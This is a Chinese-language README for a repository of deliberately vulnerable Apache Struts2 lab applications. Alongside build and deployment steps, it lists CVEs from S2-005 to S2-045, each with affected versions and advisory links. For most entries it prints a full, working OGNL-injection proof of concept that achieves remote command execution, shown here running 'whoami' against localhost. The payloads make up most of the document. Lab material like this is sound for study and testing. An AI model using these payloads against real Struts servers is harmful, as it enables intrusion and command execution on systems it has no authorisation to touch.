# 环境
Requires Java 1.8+ and Maven 3.x+

# 使用方法
1.下载
git clone https://git.oschina.net/0d/Struts2_bugs.git

2.查看远程分支
git branch -a

3.切换到分支
git checkout 分支名
如git checkout S2-045

4.打包
mvn clean package

5.部署在Tomcat中
将\target中生成的Struts2-045.war复制到Tomcat下的webapps目录中，然后开启Tomcat
访问http://127.0.0.1:8080/Struts2-045/index.action

# 相关信息

1.S2-005

CVE-2010-1870

影响版本：Struts 2.0.0 – Struts 2.1.8.1 

官方公告：http://struts.apache.org/docs/s2-005.html

POC:
http://127.0.0.1:8080/Struts2-005/index.action?('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43req\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(h)(('\43webRootzpro\75@java.lang.Runtime@getRuntime().exec(\43req.getParameter("cmd"))')(d))&(i)(('\43webRootzproreader\75new\40java.io.DataInputStream(\43webRootzpro.getInputStream())')(d))&(i01)(('\43webStr\75new\40byte[1000]')(d))&(i1)(('\43webRootzproreader.readFully(\43webStr)')(d))&(i111)(('\43webStr12\75new\40java.lang.String(\43webStr)')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i2)(('\43xman\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(i95)(('\43xman.getWriter().println(\43webStr12)')(d))&(i99)(('\43xman.getWriter().close()')(d))&cmd=cmd /c whoami

2.S2-009

CVE-2011-3923

影响版本：Struts 2.0.0 -Struts 2.3.1.1

官方公告：http://struts.apache.org/docs/s2-009.html

POC:
http://127.0.0.1:8080/Struts2-009/index.action?class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]

3.S2-013

CVE-2013-1966

影响版本：Struts 2.0.0 – Struts 2.3.14

官方公告：http://struts.apache.org/docs/s2-013.html

POC:
http://127.0.0.1:8080/Struts2-013/index.action?a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}

4.S2-016 

CVE-2013-2251

影响版本：Struts 2.0.0 – Struts 2.3.15

官方公告：http://struts.apache.org/docs/s2-016.html

POC:
http://127.0.0.1:8080/Struts2-016/index.action?redirect:$%7B%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String%5B%5D%20%7B'whoami'%7D)).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader%20(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23e%3dnew%20char%5B50000%5D,%23d.read(%23e),%23matt%3d%20%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23matt.getWriter().println%20(%23e),%23matt.getWriter().flush(),%23matt.getWriter().close()%7D

5.S2-019

CVE-2013-4316

影响版本：Struts 2.0.0 – Struts 2.3.15.1

官方公告：http://struts.apache.org/docs/s2-019.html

POC:
http://127.0.0.1:8080/Struts2-019/index.action?debug=command&expression=%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),%23req=@org.apache.struts2.ServletActionContext@getRequest(),%23resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),%23b=%23a.getInputStream(),%23c=new java.io.InputStreamReader(%23b),%23d=new java.io.BufferedReader(%23c),%23e=new char[1000],%23d.read(%23e),%23resp.println(%23e),%23resp.close()


6.S2-020

CVE-2014-0094

影响版本：Struts 2.0.0 – Struts 2.3.16

官方公告：http://struts.apache.org/docs/s2-020.html

POC:暂无


7.S2-032

CVE-2016-3081

影响版本：Struts 2.3.18 – Struts 2.3.28 

官方公告：http://struts.apache.org/docs/s2-032.html

POC:
http://127.0.0.1:8080/Struts2-032/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=\\A&ppp=%20&encoding=UTF-8


8.S2-037

CVE-2016-4438

影响版本：Struts 2.3.20 - Struts 2.3.28.1

官方公告：http://struts.apache.org/docs/s2-037.html

POC:
http://127.0.0.1:8080/Struts2-037/orders/3/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=whoami


9.S2-045

CVE-2017-5638

影响版本：Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10

官方公告：

http://struts.apache.org/docs/s2-045.html

https://cwiki.apache.org/confluence/display/WW/S2-045


POC:

POST /Struts2-045/index.action HTTP/1.1

Host: 127.0.0.1:8080

User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3

Accept-Encoding: gzip, deflate

Connection: close

Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}

Content-Length: 2
